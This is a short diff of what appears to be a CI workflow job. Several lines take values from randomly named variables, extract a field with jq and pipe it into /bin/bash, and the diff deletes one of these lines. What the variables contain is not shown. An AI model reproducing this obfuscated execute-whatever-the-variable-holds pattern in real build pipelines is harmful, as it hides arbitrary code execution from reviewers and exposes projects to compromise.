@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$lrii95159" | jq -r .aoyiz3 | /bin/bash
           echo $gljv288 | jq -r .f32 | /bin/bash
           printf '%s' "$tnbq5" | jq -r .lx81 | /bin/bash
-          echo $faor9 | jq -r .y62011 | /bin/bash
           echo $oarm53902 | jq -r .z1377 | /bin/bash
 
       - name: Save archive
